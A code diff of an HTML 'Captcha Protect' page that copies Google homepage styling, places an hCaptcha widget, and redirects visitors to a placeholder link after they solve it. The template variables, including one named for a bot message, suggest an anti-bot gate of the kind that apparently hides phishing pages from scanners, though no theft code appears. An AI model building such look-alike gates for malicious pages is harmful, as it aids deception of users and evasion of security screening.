@@ -1,10 +1,10 @@
+
 <!DOCTYPE html>
 <html itemscope='' itemtype='http://schema.org/WebPage' lang='en'>
   <head>
     <link rel='icon'href='$pro_logo'/>
-	
+
     <title>Captcha Protect</title>
-	 <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
       :root {
         --COEmY: #202124;
@@ -3372,11 +3372,11 @@
       .Zt0a5e.CB8nDe {
         background: no-repeat left 8px center;
       }
-     
+
       .GZnQqe.CB8nDe {
         background: no-repeat left center;
       }
-      
+
       .GZnQqe.LGiluc,
       .GZnQqe.EpPYLd[disabled] {
         color: #dadce0 !important;
@@ -3913,7 +3913,15 @@
         width: 100%;
       }
     </style>
-
+      <style>
+        .custom-center-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+    </style>
   </head>
   <body>
     <style>
@@ -4094,7 +4102,7 @@
                 transition: opacity 0s;
               }
             </style>
-        
+
             <button class='pz5bj' id='spchx' aria-label='fermer'>
               <span style='height: 16px; line-height: 16px; width: 16px;' class='z1asCe wuXmqc'>
                 <svg focusable='false' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path d='M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z'></path></svg>
@@ -4294,7 +4302,7 @@
                   </style>
                   <span class='spcht' style='color: #70757a;' id='spchi'></span><span class='spcht' style='color: #000;' id='spchf'></span>
                 </div>
-                
+
               </div>
               <div class='permission-bar'>
                 <style>
@@ -4346,27 +4354,18 @@
             </div>
           </div>
         </dialog>
-		<style>
-        /* Center the hCaptcha container */
-        .center-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh; /* Full height of the viewport */
-        }
-    </style>
-        <form action='' autocomplete='off' method='Post'>
-		
-		  <input type='hidden' id='captcha_res' name='captcha_res' value='$captcha_res' />
-         
+
+
+
           <p style='text-align: center;'>$message_bot</p>
 
-        
-		  <div class='center-container'>
-        <div class='h-captcha' data-sitekey='$google_cap' data-callback='onSubmit'></div>
-    </div>
-       </form>
+
+    
+       
       </div>
+	   <div class='custom-center-container'>
+        <div class='h-captcha' data-sitekey='$google_cap' data-callback='customOnSubmit'></div>
+    </div>
       <div class='o3j99 qarstb'>
 
         <div class='vcVZ7d' id='gws-output-pages-elements-homepage_additional_languages__als'>
@@ -4518,11 +4517,11 @@
         </div>
       </div>
     </div>
-<script src='https://hcaptcha.com/1/api.js' async defer></script>
+
+ <script src='https://js.hcaptcha.com/1/api.js' async defer></script>
     <script>
         function onSubmit(token) {
             if (token) {
-                // Replace with your target URL
                 window.location.href = 'https://example.com/your-link';
             } else {
                 alert('Please complete the hCaptcha.');
